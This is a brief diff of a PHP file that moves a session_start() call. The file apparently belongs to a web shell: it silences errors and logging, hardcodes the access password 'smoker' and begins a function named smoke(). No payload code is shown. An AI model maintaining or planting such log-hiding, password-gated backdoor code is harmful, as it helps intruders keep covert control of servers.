@@ -5,6 +5,7 @@
 #######################################
 
 error_reporting(0);
+session_start();
 @clearstatcache();
 @ini_set('error_log', null);
 @ini_set('log_errors', 0);
@@ -12,7 +13,7 @@ error_reporting(0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 $passwd = "smoker";
-session_start();
+
 function smoke($str)
 {
 
